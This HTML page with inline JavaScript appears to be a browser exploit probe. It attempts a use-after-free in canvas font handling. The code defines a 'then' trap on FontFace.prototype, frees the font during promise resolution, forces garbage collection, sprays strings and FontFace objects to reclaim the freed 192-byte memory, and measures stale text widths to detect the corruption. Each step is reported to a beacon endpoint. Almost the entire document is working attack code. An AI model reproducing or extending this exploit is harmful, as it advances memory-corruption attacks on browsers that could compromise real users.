<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1154v2</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body>
<canvas id="cv" width="600" height="100" style="display:none"></canvas>
<canvas id="cv2" width="600" height="100" style="display:none"></canvas>
<div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}

log('phase','=== P1154v2: CANVAS STALE FONT UAF (timing fix) ===');
log('info','Fix: define then getter BEFORE font load');
B('P1154V2-START','t='+Date.now());

var r=Date.now()%100000;
var uafHit=false;
var weakFF=null;
var frFired=false;
var startT=Date.now();

// FinalizationRegistry
var fr=new FinalizationRegistry(function(tag){
  frFired=true;
  B('P1154V2-FR','collected|dt='+(Date.now()-startT));
});

// === STEP 0: Define the then getter FIRST, BEFORE creating any FontFace ===
// This ensures the thenable trap is ready when ff.loaded resolves
Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;
  uafHit=true;
  B('P1154V2-THEN-HIT','got then getter');
  var self=this;
  return function(resolve,reject){
    B('P1154V2-THEN-EXEC','rejecting');
    // Remove style, delete from fonts, break all refs
    if(typeof stEl!=='undefined'&&stEl&&stEl.parentNode)stEl.remove();
    try{document.fonts.delete(self);}catch(e){}
    document.body.offsetHeight;
    self=null;
    reject(new Error('freed'));
  };
},set:function(){}});

// === STEP 1: Create font with distinctive metrics ===
var stEl=document.createElement('style');
stEl.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0041-005A}";
document.head.appendChild(stEl);
var ff=new FontFace('y'+r,'local(Helvetica),local(Arial)',{unicodeRange:'U+0041-005A'});

// Register weak tracking BEFORE adding to fonts
weakFF=new WeakRef(ff);
fr.register(ff,'ff-'+r);

// Add to fonts and trigger load — then getter is ALREADY in place
document.fonts.add(ff);

// Set canvas fonts BEFORE the thenable fires
var cv=document.getElementById('cv');
var ctx=cv.getContext('2d');
var cv2=document.getElementById('cv2');
var ctx2=cv2.getContext('2d');
ctx.font='20px "y'+r+'"';
ctx2.font='20px "y'+r+'", monospace';

// Measure baselines
var liveW1=ctx.measureText('ABCDEFGHIJ').width;
var liveW2=ctx2.measureText('ABCDEFGHIJ').width;
var ctxMono=document.createElement('canvas').getContext('2d');
ctxMono.font='20px monospace';
var monoW=ctxMono.measureText('ABCDEFGHIJ').width;
B('P1154V2-BASELINE','live1='+liveW1+'|live2='+liveW2+'|mono='+monoW);

// NOW trigger the load — the then getter will fire during promise resolution
void ff.loaded;

// Also trigger via fonts.load as backup
ff=null; // drop strong ref
document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});

// === STEP 2: Check at 300ms if thenable fired ===
setTimeout(function(){
  B('P1154V2-CHECK','uafHit='+uafHit+'|dt='+(Date.now()-startT));
  if(!uafHit){
    // Try alternative: directly call ff.loaded again if we can access it
    // Also try fonts.load with just the one font
    try{
      document.fonts.load('20px "y'+r+'"','ABCDEFGHIJ').then(function(arr){
        B('P1154V2-LOAD2','resolved|len='+(arr?arr.length:'?'));
      },function(e){
        B('P1154V2-LOAD2','rejected|'+(e?e.message:'?'));
      });
    }catch(e){}
  }

  // Clean up then getter after 500ms regardless
  setTimeout(function(){
    delete FontFace.prototype.then;
    B('P1154V2-THEN-CLEANED','uafHit='+uafHit);

    if(!uafHit){
      B('P1154V2-NOHIT','thenable never fired');
      log('fail','Thenable never fired - trying manual free approach');
      doManualFree();
      return;
    }

    // Measure immediately with stale font
    var immedW1=ctx.measureText('ABCDEFGHIJ').width;
    var immedW2=ctx2.measureText('ABCDEFGHIJ').width;
    B('P1154V2-IMMED','w1='+immedW1+'|w2='+immedW2+'|live1='+liveW1);

    // Start GC rounds
    doGC(0);
  },300);
},300);

// === Manual free path (if thenable doesn't work) ===
function doManualFree(){
  log('phase','--- Manual free: delete + style remove ---');
  // Remove style
  if(stEl&&stEl.parentNode)stEl.remove();
  // Iterator delete
  try{
    document.fonts.forEach(function(f){
      try{
        if(f.family&&f.family.indexOf('y'+r)!==-1){
          document.fonts.delete(f);
        }
      }catch(e){}
    });
  }catch(e){}
  document.body.offsetHeight;

  var sz=document.fonts.size;
  var chk='';
  try{chk=document.fonts.check('1em y'+r);}catch(e){chk='err';}
  B('P1154V2-MANUAL','sz='+sz+'|check='+chk);

  // Set canvas fonts for stale test
  // ctx and ctx2 already have their fonts set from before

  // Measure pre-GC with stale font
  var preW1=ctx.measureText('ABCDEFGHIJ').width;
  var preW2=ctx2.measureText('ABCDEFGHIJ').width;
  B('P1154V2-MANUAL-PRE','w1='+preW1+'|w2='+preW2);

  doGC(0);
}

// === GC rounds ===
var gcRound=0;
function doGC(round){
  gcRound=round+1;
  var trash=[];
  for(var g=0;g<2000;g++)trash.push(new ArrayBuffer(2048));
  trash=null;
  for(var g=0;g<10000;g++){var s=String(g).repeat(80);s=null;}
  for(var g=0;g<5000;g++){var o={a:new Array(100)};o=null;}
  for(var g=0;g<3000;g++){var b=new ArrayBuffer(512);b=null;}

  var wr='?';
  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
  B('P1154V2-GC'+gcRound,'wr='+wr+'|fr='+frFired+'|dt='+(Date.now()-startT));

  if(wr==='collected'){
    doStaleTest();
    return;
  }
  if(gcRound<12){
    setTimeout(function(){doGC(gcRound);},1500);
  }else{
    B('P1154V2-GC-FAIL','not collected after 12 rounds');
    doStaleTest(); // try anyway
  }
}

var staleDone=false;
function doStaleTest(){
  if(staleDone)return;
  staleDone=true;

  var wr='?';
  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
  B('P1154V2-STALE-BEGIN','wr='+wr+'|fr='+frFired+'|uafHit='+uafHit);
  log('phase','--- Stale font test (wr='+wr+') ---');

  // === TEST A: measureText with STALE canvas font (no re-set!) ===
  var preSprayW1=-1, preSprayW2=-1;
  try{preSprayW1=ctx.measureText('ABCDEFGHIJ').width;}catch(e){preSprayW1='ERR:'+e.message.substring(0,30);}
  try{preSprayW2=ctx2.measureText('ABCDEFGHIJ').width;}catch(e){preSprayW2='ERR:'+e.message.substring(0,30);}
  B('P1154V2-A-PRE','w1='+preSprayW1+'|w2='+preSprayW2+'|liveW1='+liveW1+'|mono='+monoW);

  // === TEST B: Spray strings to reclaim 192B zone ===
  log('phase','--- String spray: 3000 x 180-char ---');
  var strSpray=[];
  for(var k=0;k<3000;k++){
    strSpray.push('C'.repeat(180));
  }
  B('P1154V2-B-SPRAY','count='+strSpray.length);

  // === TEST C: measureText AFTER spray with STALE font ===
  var postSprayW1=-1, postSprayW2=-1;
  try{postSprayW1=ctx.measureText('ABCDEFGHIJ').width;}catch(e){postSprayW1='ERR:'+e.message.substring(0,30);}
  try{postSprayW2=ctx2.measureText('ABCDEFGHIJ').width;}catch(e){postSprayW2='ERR:'+e.message.substring(0,30);}
  B('P1154V2-C-POST','w1='+postSprayW1+'|w2='+postSprayW2);

  var changed1=(preSprayW1!==postSprayW1);
  var changed2=(preSprayW2!==postSprayW2);
  var diffFromLive1=(postSprayW1!==liveW1);
  B('P1154V2-C-DIFF','ch1='+changed1+'|ch2='+changed2+'|dfL1='+diffFromLive1);

  if(changed1||changed2){
    log('win','!!! WIDTH CHANGED AFTER SPRAY - STALE DATA READ !!!');
    B('P1154V2-UAF-HIT','pre1='+preSprayW1+'|post1='+postSprayW1+'|pre2='+preSprayW2+'|post2='+postSprayW2);
  }

  // === TEST D: fillText with stale font ===
  try{
    ctx.fillStyle='#ff0000';
    ctx.fillText('ABCDEFGHIJ',10,40);
    var pix=ctx.getImageData(0,0,600,50);
    var nonZero=0;
    for(var i=0;i<pix.data.length;i+=4){
      if(pix.data[i]>0||pix.data[i+1]>0||pix.data[i+2]>0)nonZero++;
    }
    B('P1154V2-D-RENDER','nonZeroPixels='+nonZero);
  }catch(e){B('P1154V2-D-RENDER','ERR:'+e.message.substring(0,40));}

  // === TEST E: FontFace same-type spray ===
  var ffSpray=[];
  var wts=['100','200','300','400','500','600','700','800','900'];
  for(var k=0;k<200;k++){
    try{
      var nf=new FontFace('spray'+r+'x'+k,'local(Courier)',{weight:wts[k%9]});
      document.fonts.add(nf);
      ffSpray.push(nf);
    }catch(e){}
  }
  B('P1154V2-E-FFSPRAY','count='+ffSpray.length);

  // Stale canvas after FontFace spray
  var postFFW=-1;
  try{postFFW=ctx2.measureText('ABCDEFGHIJ').width;}catch(e){postFFW='ERR';}
  B('P1154V2-E-POST','w='+postFFW+'|changed='+(postFFW!==postSprayW2));

  // === TEST F: fonts.check and fonts.load ===
  var chkF='';
  try{chkF=document.fonts.check('1em y'+r);}catch(e){chkF='err:'+e.message.substring(0,20);}
  B('P1154V2-F-CHECK','check='+chkF+'|sz='+document.fonts.size);

  try{
    document.fonts.load('1em y'+r).then(
      function(arr){
        B('P1154V2-F-LOAD','resolved|len='+(arr?arr.length:'?'));
        if(arr&&arr.length>0){
          for(var i=0;i<arr.length&&i<3;i++){
            var fam='',stat='';
            try{fam=arr[i].family;}catch(e){fam='ERR';}
            try{stat=arr[i].status;}catch(e){stat='ERR';}
            B('P1154V2-F-FF'+i,'fam='+fam+'|stat='+stat);
          }
        }
        finishUp();
      },
      function(e){
        B('P1154V2-F-LOAD','rejected|msg='+(e?e.message:'?'));
        finishUp();
      }
    );
  }catch(e){
    B('P1154V2-F-LOAD','threw|msg='+e.message.substring(0,40));
    finishUp();
  }
}

function finishUp(){
  var wr='?';
  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
  B('P1154V2-SUMMARY','wr='+wr+'|fr='+frFired+'|uafHit='+uafHit+'|dt='+(Date.now()-startT));
  B('P1154V2-DONE','complete');
  log('phase','=== P1154v2 COMPLETE ===');
}

setTimeout(function(){
  if(!staleDone){
    B('P1154V2-TIMEOUT','dt='+(Date.now()-startT));
    finishUp();
  }
},30000);
</script></body></html>
